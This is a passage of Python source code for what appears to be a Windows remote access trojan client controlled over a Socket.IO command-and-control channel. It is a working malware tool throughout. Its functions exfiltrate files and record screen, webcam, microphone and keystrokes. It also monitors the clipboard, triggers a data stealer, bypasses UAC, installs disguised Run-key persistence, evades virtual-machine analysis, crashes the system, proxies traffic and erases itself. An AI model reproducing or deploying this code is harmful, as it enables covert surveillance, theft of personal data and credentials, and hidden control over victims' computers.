        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[ZIP] Folder zipped to {zip_path}. You can now download this file.'})
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[ZIP ERROR] {str(e)}'})

def handle_upload_file(data):
    """Save a file sent from the dashboard to the client's disk"""
    try:
        filename = data.get('filename')
        dest_path = data.get('path', './')
        file_data = data.get('data')
        if not filename or not file_data: return
        
        full_path = os.path.join(dest_path, filename)
        with open(full_path, 'wb') as f:
            f.write(base64.b64decode(file_data))
            
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[FS] Successfully uploaded: {filename} to {dest_path}'})
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[UPLOAD ERROR] {str(e)}'})

def handle_download_request(data):
    """Upload a file from client to server for operator download"""
    try:
        path = data.get('path')
        if not path or not os.path.exists(path):
            sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[DOWNLOAD ERROR] File not found: {path}'})
            return
            
        with open(path, 'rb') as f:
            content = base64.b64encode(f.read()).decode()
            sio_client.emit('exfiltrate_file', {
                'client_id': RAT_ID,
                'filename': os.path.basename(path),
                'data': content
            })
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[FS] File {os.path.basename(path)} sent to server.'})
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[DOWNLOAD ERROR] {str(e)}'})

def handle_get_registry(data):
    """List keys and values in a registry path"""
    try:
        path = data.get('path', r"Software\Microsoft\Windows\CurrentVersion")
        root_name = data.get('root', 'HKCU')
        roots = {
            'HKCU': winreg.HKEY_CURRENT_USER,
            'HKLM': winreg.HKEY_LOCAL_MACHINE,
            'HKCR': winreg.HKEY_CLASSES_ROOT,
            'HKU': winreg.HKEY_USERS
        }
        root = roots.get(root_name, winreg.HKEY_CURRENT_USER)
        
        items = []
        with winreg.OpenKey(root, path, 0, winreg.KEY_READ) as key:
            # Enumerate subkeys
            i = 0
            while True:
                try:
                    items.append({'name': winreg.EnumKey(key, i), 'type': 'key'})
                    i += 1
                except OSError: break
            
            # Enumerate values
            i = 0
            while True:
                try:
                    name, val, type_id = winreg.EnumValue(key, i)
                    items.append({'name': name, 'value': str(val), 'type': 'value', 'type_id': type_id})
                    i += 1
                except OSError: break
                
        sio_client.emit('registry_list', {'client_id': RAT_ID, 'path': path, 'root': root_name, 'items': items})
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[REG ERROR] {str(e)}'})

def handle_write_registry(data):
    """Create or modify a registry value"""
    try:
        path = data.get('path')
        root_name = data.get('root', 'HKCU')
        name = data.get('name')
        value = data.get('value')
        type_id = data.get('type_id', winreg.REG_SZ)
        
        roots = {
            'HKCU': winreg.HKEY_CURRENT_USER,
            'HKLM': winreg.HKEY_LOCAL_MACHINE,
            'HKCR': winreg.HKEY_CLASSES_ROOT,
            'HKU': winreg.HKEY_USERS
        }
        root = roots.get(root_name, winreg.HKEY_CURRENT_USER)
        
        with winreg.OpenKey(root, path, 0, winreg.KEY_SET_VALUE) as key:
            if type_id == winreg.REG_DWORD: value = int(value)
            winreg.SetValueEx(key, name, 0, type_id, value)
            
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[REG] Successfully wrote {name} to {path}'})
        # Refresh current view
        handle_get_registry(data)
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[REG WRITE ERROR] {str(e)}'})

def handle_delete_registry(data):
    """Delete a registry value or key"""
    try:
        path = data.get('path')
        root_name = data.get('root', 'HKCU')
        name = data.get('name')
        is_key = data.get('is_key', False)
        
        roots = {
            'HKCU': winreg.HKEY_CURRENT_USER,
            'HKLM': winreg.HKEY_LOCAL_MACHINE,
            'HKCR': winreg.HKEY_CLASSES_ROOT,
            'HKU': winreg.HKEY_USERS
        }
        root = roots.get(root_name, winreg.HKEY_CURRENT_USER)
        
        if is_key:
            winreg.DeleteKey(root, f"{path}\\{name}")
            sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[REG] Successfully deleted key {name}'})
        else:
            with winreg.OpenKey(root, path, 0, winreg.KEY_SET_VALUE) as key:
                winreg.DeleteValue(key, name)
            sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[REG] Successfully deleted value {name}'})
            
        # Refresh current view
        handle_get_registry(data)
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[REG DELETE ERROR] {str(e)}'})

# --- Session Recording (Phase 2) ---

def stream_record_loop():
    """Background loop to capture frames and send to server for storage"""
    global is_recording
    while is_recording:
        try:
            img_data = capture_screen() # Re-use capture_screen for high-quality JPGs
            if img_data:
                sio_client.emit('save_record', {'client_id': RAT_ID, 'type': 'screen', 'data': img_data})
            time.sleep(1) # Record at 1 FPS to save server space
        except: pass

# --- Maintenance & Stealth (Phase 4) ---

def handle_self_destruct(data):
    """Remove RAT traces and terminate"""
    try:
        # 1. Remove Registry Persistence
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "WindowsUpdate")
            winreg.CloseKey(key)
        except: pass
        
        # 2. Delete Startup File (if possible)
        try:
            startup_path = Path.home() / "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" / EXE_NAME
            if startup_path.exists(): startup_path.unlink()
        except: pass

        # 3. Commit suicide via batch script
        batch_path = Path.home() / "AppData\\Local\\Temp\\cleanup.bat"
        with open(batch_path, "w") as f:
            f.write(f'@echo off\ntimeout /t 3 /nobreak > nul\ndel "{EXE_PATH}"\ndel "%~f0"')
        
        subprocess.Popen(["cmd.exe", "/c", str(batch_path)], creationflags=subprocess.DETACHED_PROCESS)
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[!] Self-destruct initiated. Goodbye.'})
        time.sleep(1)
        os._exit(0)
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[ERROR] Self-destruct failed: {str(e)}'})

def handle_update(data):
    """Bridge for manual update request from dashboard"""
    url = data.get('url')
    if url:
        execute_update(url)

def handle_mouse_move(data):
    """Handle absolute mouse movement (scaled 0.0-1.0) using native win32api"""
    try:
        x, y = data.get('x', 0), data.get('y', 0)
        sw, sh = pyautogui.size()
        # Use native win32api for zero-latency movement
        win32api.SetCursorPos((int(x * sw), int(y * sh)))
    except: pass

def handle_mouse_move_relative(data):
    """Handle relative mouse movement (dx, dy) for FPS-style control"""
    try:
        dx, dy = data.get('dx', 0), data.get('dy', 0)
        # Use win32api for direct low-level mouse control
        win32api.mouse_event(win32con.MOUSEEVENTF_MOVE, int(dx), int(dy), 0, 0)
    except: pass

def handle_mouse_click(data):
    """Handle native mouse clicks"""
    try:
        button = data.get('btn', 'left')
        action = data.get('action', 'click')
        
        # Mapping for win32 mouse events
        btn_map = {
            'left': (win32con.MOUSEEVENTF_LEFTDOWN, win32con.MOUSEEVENTF_LEFTUP),
            'right': (win32con.MOUSEEVENTF_RIGHTDOWN, win32con.MOUSEEVENTF_RIGHTUP),
            'middle': (win32con.MOUSEEVENTF_MIDDLEDOWN, win32con.MOUSEEVENTF_MIDDLEUP)
        }
        
        down_evt, up_evt = btn_map.get(button, btn_map['left'])
        
        if action == 'click':
            win32api.mouse_event(down_evt, 0, 0, 0, 0)
            win32api.mouse_event(up_evt, 0, 0, 0, 0)
        elif action == 'down':
            win32api.mouse_event(down_evt, 0, 0, 0, 0)
        elif action == 'up':
            win32api.mouse_event(up_evt, 0, 0, 0, 0)
    except: pass

def handle_key_press(data):
    try:
        key = data.get('key')
        action = data.get('action', 'press')
        # Map some keys if necessary
        if action == 'press':
            pyautogui.press(key)
        elif action == 'down':
            pyautogui.keyDown(key)
        elif action == 'up':
            pyautogui.keyUp(key)
    except: pass

def handle_scroll(data):
    try:
        pyautogui.scroll(data.get('delta', 0))
    except: pass

def get_detailed_sysinfo():
    """Collect comprehensive system information"""
    try:
        mem = psutil.virtual_memory()
        disk = psutil.disk_usage('/')
        
        # Try to get GPU info
        gpu_info = "N/A"
        try:
            import wmi
            w = wmi.WMI()
            gpu_info = [g.Name for g in w.Win32_VideoController()]
            gpu_info = ", ".join(gpu_info)
        except: pass

        return {
            "id": RAT_ID,
            "hostname": socket.gethostname(),
            "username": os.getlogin(),
            "os": f"Windows {os.sys.getwindowsversion().major}",
            "cpu": f"{psutil.cpu_count(logical=False)} Core / {psutil.cpu_count()} Thread",
            "ram": f"{round(mem.total / (1024**3), 2)} GB ({mem.percent}% used)",
            "disk": f"{round(disk.total / (1024**3), 2)} GB ({disk.percent}% used)",
            "gpu": gpu_info,
            "ip": socket.gethostbyname(socket.gethostname()),
            "mac": ':'.join(['{:02x}'.format((sys.getnode() >> ele) & 0xff) for ele in range(0, 8*6, 8)][::-1]),
            "boot_time": datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
        }
    except Exception as e:
        return {"id": RAT_ID, "error": str(e)}

# --- Audio Spy (Phase 5) ---

def record_audio_30s():
    """Record 30s of microphone audio and send as .wav"""
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write
        
        fs = 44100  # Sample rate
        seconds = 30  # Duration
        
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
        sd.wait()  # Wait for recording
        
        # Save to memory instead of disk
        import io
        buffer = io.BytesIO()
        write(buffer, fs, myrecording)
        
        img_data = base64.b64encode(buffer.getvalue()).decode()
        sio_client.emit('save_record', {'client_id': RAT_ID, 'type': 'audio', 'data': img_data})
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[AUDIO] 30s recording sent to server.'})
    except Exception as e:
        sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[AUDIO ERROR] {str(e)}'})

def socketio_handler():
    """Main SocketIO C2 loop"""
    global sio_client, screen_streaming
    
    def connect():
        print(f"[+] RAT {RAT_ID} connected")
        sys_info = get_system_info()
        sio_client.emit('register_client', {
            'client_id': RAT_ID,
            'os': sys_info['os'],
            'hostname': sys_info['hostname'],
            'username': sys_info.get('username', 'unknown')
        })
        http_post(sys_info)
    
    def disconnect():
        print(f"[-] RAT {RAT_ID} disconnected")
    
    def run_command(data):
        cmd = data.get('cmd', '')
        terminal_type = data.get('type', 'cmd')
        
        if terminal_type == 'powershell':
            result = safe_ps_exec(cmd)
        else:
            result = safe_cmd_exec(cmd)
            
        sio_client.emit('cmd_result', {
            'client_id': RAT_ID,
            'result_id': data.get('id'),
            'output': result['output']
        })

    def stream_screen_loop():
        global screen_streaming, current_monitor
        last_send = 0
        while screen_streaming:
            now = time.time()
            if now - last_send >= 0.033:
                img_data = capture_screen(current_monitor)
                if img_data:
                    sio_client.emit('screen_data', {
                        'client_id': RAT_ID,
                        'image': img_data
                    })
                last_send = now
            time.sleep(0.001)

    def stream_webcam_loop():
        global webcam_streaming
        if not HAS_CV2:
            return
        try:
            cap = cv2.VideoCapture(0)
            last_send = 0
            while webcam_streaming:
                now = time.time()
                if now - last_send >= 0.033:
                    ret, frame = cap.read()
                    if ret:
                        ret, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
                        if ret:
                            img_data = base64.b64encode(buffer).decode()
                            sio_client.emit('webcam_data', {
                                'client_id': RAT_ID,
                                'image': img_data
                            })
                    last_send = now
                time.sleep(0.001)
        except:
            pass
        finally:
            if 'cap' in locals():
                cap.release()

    def stream_audio_loop():
        global audio_streaming
        if not HAS_SOUNDDEVICE:
            return
        
        try:
            # 16kHz mono is good for voice and lightweight for streaming
            fs = 16000
            chunk_size = int(fs * 0.1) # 100ms chunks
            
            with sd.InputStream(samplerate=fs, channels=1, dtype='float32') as stream:
                while audio_streaming:
                    audio_chunk, overflowed = stream.read(chunk_size)
                    if audio_chunk is not None:
                        # Convert to base64 for transport
                        chunk_b64 = base64.b64encode(audio_chunk.tobytes()).decode()
                        sio_client.emit('audio_data', {
                            'client_id': RAT_ID,
                            'data': chunk_b64,
                            'fs': fs
                        })
                    time.sleep(0.01)
        except Exception as e:
            print(f"Audio stream error: {e}")
            audio_streaming = False

    def toggle_stream(data):
        global screen_streaming, webcam_streaming, audio_streaming, current_monitor
        enabled = data.get('enabled', False)
        stream_type = data.get('stream_type', 'screen')
        
        if stream_type == 'screen':
            screen_streaming = enabled
            current_monitor = data.get('monitor', 1)
            if enabled:
                threading.Thread(target=stream_screen_loop, daemon=True).start()
        elif stream_type == 'webcam':
            webcam_streaming = enabled
            if enabled:
                threading.Thread(target=stream_webcam_loop, daemon=True).start()
        elif stream_type == 'audio':
            audio_streaming = enabled
            if enabled:
                threading.Thread(target=stream_audio_loop, daemon=True).start()
        elif stream_type == 'screenshot':
            img_data = capture_screen(data.get('monitor', 1))
            if img_data:
                sio_client.emit('screen_data', {'client_id': RAT_ID, 'image': img_data})
        elif stream_type == 'list_files':
            # Phase 4 Update: Use structured JSON for visual file manager
            try:
                path = data.get('path', './')
                file_list = []
                for entry in os.scandir(path):
                    stats = entry.stat()
                    file_list.append({
                        'name': entry.name,
                        'is_dir': entry.is_dir(),
                        'size': stats.st_size,
                        'mtime': stats.st_mtime
                    })
                sio_client.emit('file_list', {
                    'client_id': RAT_ID,
                    'path': path,
                    'files': file_list
                })
            except Exception as e:
                sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': f'[FS ERROR] {str(e)}'})
        elif stream_type == 'download':
            handle_download_request(data)
        elif stream_type == 'socks5':
            if enabled:
                threading.Thread(target=socks5_proxy_thread, daemon=True).start()
                sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[SOCKS5] Started on local port 9050'})
        elif stream_type == 'record':
            is_recording = enabled
            if enabled:
                threading.Thread(target=stream_record_loop, daemon=True).start()
                sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[REC] Session recording started...'})
            else:
                sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[REC] Session recording saved to server.'})
    
    sio_client = socketio.Client()
    sio_client.on('connect', connect)
    sio_client.on('disconnect', disconnect)
    sio_client.on('run_command', run_command)
    sio_client.on('toggle_stream', toggle_stream)
    
    # Input events
    sio_client.on('mouse_move', handle_mouse_move)
    sio_client.on('mouse_move_relative', handle_mouse_move_relative)
    sio_client.on('mouse_click', handle_mouse_click)
    sio_client.on('key_press', handle_key_press)
    sio_client.on('scroll', handle_scroll)
    
    # Process management
    sio_client.on('get_processes', handle_get_processes)
    sio_client.on('kill_process', handle_kill_process)
    
    # Information & Metrics
    sio_client.on('get_sysinfo', lambda data: sio_client.emit('sysinfo_data', {'client_id': RAT_ID, 'info': get_detailed_sysinfo()}))
    
    # Registry management
    sio_client.on('get_registry', handle_get_registry)
    sio_client.on('write_registry', handle_write_registry)
    sio_client.on('delete_registry', handle_delete_registry)
    
    # Advanced File Manager
    sio_client.on('file_search', handle_file_search)
    sio_client.on('zip_folder', handle_zip_folder)
    sio_client.on('upload_file', handle_upload_file)
    
    # Audio Spy
    sio_client.on('record_audio', lambda data: threading.Thread(target=record_audio_30s, daemon=True).start())
    
    # Information Stealers
    sio_client.on('steal_data', handle_steal_data)
    
    # Maintenance
    sio_client.on('self_destruct', handle_self_destruct)
    sio_client.on('update_rat', handle_update)
    sio_client.on('trigger_bsod', lambda data: threading.Thread(target=trigger_bsod, args=(data.get('mode', 'real'),), daemon=True).start())
    
    # Persistence Check
    def handle_check_persistence(data):
        try:
            # Simple check for now
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_READ)
            winreg.CloseKey(key)
            sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[✓] Persistence is ACTIVE and HEALTHY.'})
        except:
            sio_client.emit('cmd_result', {'client_id': RAT_ID, 'output': '[✗] Persistence is BROKEN or REMOVED.'})
    sio_client.on('check_persistence', handle_check_persistence)
    
    while is_running:
        try:
            sio_client.connect(SERVER_URL)
            sio_client.wait()
        except:
            time.sleep(5)

def main_loop():
    """Main stealth loop"""
    hide_console()
    
    # VM Detection & Reporting
    vm_reasons = check_vm()
    if vm_reasons:
        # Report detection before exiting (if possible)
        try:
            requests.post(f"{SERVER_URL}/heartbeat", json={
                "id": RAT_ID,
                "type": "alert",
                "msg": f"VM Detected: {', '.join(vm_reasons)}",
                "severity": "high"
            }, timeout=5)
        except: pass
        if getattr(sys, 'frozen', False): 
            # Self-destruct if in a VM to prevent analysis
            handle_self_destruct({})
            return
        
    # Try to elevate to Admin
    uac_bypass()
    
    # Inject into Explorer for added stability
    # inject_into_process("explorer.exe")
    
    install_persistence()
    threading.Thread(target=send_to_discord, daemon=True).start()
    
    # Start background threads
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=socketio_handler, daemon=True).start()
    threading.Thread(target=clipboard_monitor_thread, daemon=True).start()
    
    # Auto-Update check on startup
    threading.Thread(target=check_for_updates, daemon=True).start()
    
    # Heartbeat loop
    last_persistence_check = 0
    last_update_check = time.time()
    while is_running:
        now = time.time()
        # Check persistence every hour
        if now - last_persistence_check > 3600:
            check_persistence()
            last_persistence_check = now
            
        # Check for updates every 4 hours (14400s)
        if now - last_update_check > 14400:
            threading.Thread(target=check_for_updates, daemon=True).start()
            last_update_check = now
            
        metrics = get_system_metrics()
        active_win = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        
        # Periodic tasks
        flush_keys() # Ensure keys are sent even if buffer not full
        
        http_post({"type": "heartbeat", "metrics": metrics, "active_window": active_win})
        if sio_client and sio_client.connected:
            sio_client.emit('heartbeat', {"client_id": RAT_ID, "metrics": metrics, "active_window": active_win})
        
        time.sleep(15) # Increased frequency for better responsiveness

if __name__ == "__main__":
    # Anti-debug / respawn protection
    if not getattr(sys, 'frozen', False):
        main_loop()
    else:
        try:
            main_loop()
        except:
            # Auto-restart
            subprocess.Popen([sys.executable, __file__], creationflags=subprocess.DETACHED_PROCESS)